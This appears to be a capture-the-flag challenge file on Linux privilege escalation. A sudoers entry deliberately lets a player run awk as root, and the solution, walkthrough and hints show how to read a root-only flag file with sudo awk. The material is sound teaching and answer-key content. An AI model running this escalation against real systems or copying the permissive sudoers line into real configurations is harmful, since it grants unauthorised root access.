@@ -1,0 +1,42 @@
+title: A text tool with too much power
+level: Intermediate
+kind: Privilege escalation
+points: 70
+order: 14
+answer: flag
+
+@intro
+Run sudo -l to see what you may run as root. The one command there can read any file,
+so you can reach the flag in /root/flag.txt even though only root may read it.
+
+@setup
+echo 'player ALL=(root) NOPASSWD: /usr/bin/awk' > /etc/sudoers.d/player
+chmod 440 /etc/sudoers.d/player
+printf '%s\n' '{{FLAG}}' > /root/flag.txt
+chmod 600 /root/flag.txt
+
+@solution
+sudo -l
+cat /root/flag.txt
+sudo awk '{ print }' /root/flag.txt
+
+@walkthrough
+sudo -l shows: (root) NOPASSWD: /usr/bin/awk. awk reads files and prints them, and
+here it runs as root, so it reads a file you normally can't:
+
+    cat /root/flag.txt            # Permission denied for you
+    sudo awk '{ print }' /root/flag.txt
+
+awk can also run shell commands (system("...")), which would give a full root shell.
+The lesson: never give sudo rights to a program that can read any file or run other
+programs (awk, vi, less, find, tar, man...). Allow the exact command needed instead.
+
+@hint 5
+Whenever you get a new account, ask what it is allowed to do as someone more powerful. On Linux that question is sudo -l.
+
+@hint 10
+sudo -l lists one text tool you may run as root. A text tool reads files, and under sudo it reads them as root - including /root/flag.txt, which you can't cat yourself.
+
+@hint 18
+The tool is awk; '{ print }' tells it to print every line it reads:
+sudo awk '{ print }' /root/flag.txt
